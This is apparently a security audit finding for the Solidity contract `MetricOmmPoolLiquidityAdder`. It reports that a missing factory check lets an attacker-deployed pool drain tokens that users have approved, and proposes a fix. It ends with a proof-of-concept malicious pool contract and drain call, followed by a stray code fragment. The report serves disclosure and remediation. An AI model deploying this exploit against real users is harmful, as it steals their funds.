### Title
Missing factory validation in `MetricOmmPoolLiquidityAdder` allows a malicious pool to drain user tokens up to caller-supplied caps — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address in every `addLiquidity*` entry point without verifying it against the factory registry. The callback guard only checks that `msg.sender` equals the pool address the caller supplied, so a malicious pool that the attacker themselves deployed passes the check. The malicious pool can then instruct the adder to pull up to `maxAmountToken0` / `maxAmountToken1` of any ERC-20 tokens from the victim's wallet.

The contract's own NatSpec acknowledges the gap:

> *"The caller is responsible for supplying a legitimate pool address and other non-malicious parameters. This contract does not verify the pool against the factory; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement."* [1](#0-0) 

---

### Finding Description

**Entry points** — `addLiquidityExactShares` (both overloads) and `addLiquidityWeighted` (both overloads) all forward the caller-supplied `pool` address directly into `_addLiquidity` → `_setPayContext`, which stores it as the authorised callback caller. [2](#0-1) [3](#0-2) 

**Callback guard** — `metricOmmModifyLiquidityCallback` only verifies `msg.sender == expectedPool`. Because `expectedPool` was set to the attacker-controlled address, the check passes unconditionally. [4](#0-3) 

**Token resolution** — After the guard, the callback calls `IMetricOmmPool(msg.sender).getImmutables()` to learn which tokens to pull. The malicious pool controls the return value, so it can name any ERC-20 the victim has approved. [5](#0-4) 

**Payment** — `pay(token0, payer, msg.sender, amount0Delta)` transfers tokens from the victim (`payer = msg.sender` of the original call) to the malicious pool (`msg.sender` of the callback), up to the victim's stated `maxAmountToken0` / `maxAmountToken1`. [6](#0-5) 

---

### Impact Explanation

A victim who has approved `MetricOmmPoolLiquidityAdder` to spend their tokens (a prerequisite for any legitimate use) and is induced to call any `addLiquidity*` function with an attacker-controlled pool address loses up to `maxAmountToken0 + maxAmountToken1` worth of tokens in a single transaction. There is no recovery path; the tokens are transferred directly to the malicious pool. This is a **direct loss of user principal**.

---

### Likelihood Explanation

Any unprivileged attacker can deploy a malicious pool contract. The victim only needs to be directed to a spoofed or compromised frontend that substitutes the pool address. Because the `MetricOmmPoolLiquidityAdder` is a shared periphery contract that users must approve before adding liquidity, a single approval is sufficient for the attacker to drain the full approved amount. The attack requires no special role, no governance action, and no non-standard token behaviour.

---

### Recommendation

Before storing the pool address in transient context, verify it was deployed by the canonical factory:

```solidity
// In _addLiquidity (and the probe path in addLiquidityWeighted):
require(IMetricOmmPoolFactory(factory).isPool(pool), "Unknown pool");
```

This mirrors the fix applied to the Teller M-10 bug: an `isMarketOpen` check was added to `submitBid` to ensure the referenced market actually exists in the registry before any state is committed.

---

### Proof of Concept

```solidity
// Attacker deploys this contract
contract MaliciousPool {
    address victim;
    address adder;
    address token;

    constructor(address _victim, address _adder, address _token) {
        victim = _victim; adder = _adder; token = _token;
    }

    // Implements IMetricOmmPoolActions.addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata,
                          bytes calldata callbackData, bytes calldata)
        external returns (uint256, uint256)
    {
        // Call back into the adder; amount0Delta == victim's full cap
        IMetricOmmPoolLiquidityAdder(adder)
            .metricOmmModifyLiquidityCallback(MAX_AMOUNT, 0, callbackData);
        return (MAX_AMOUNT, 0);
    }

    // Implements IMetricOmmPool.getImmutables
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token; // any token victim approved
    }
}

// Victim (or attacker on victim's behalf) calls:
adder.addLiquidityExactShares(
    address(maliciousPool),
    victim,
    0,
    deltas,
    MAX_AMOUNT,   // maxAmountToken0 — attacker drains this much
    0,
    ""
);
// Result: MAX_AMOUNT of `token` transferred from victim to maliciousPool.
```

    address pool,
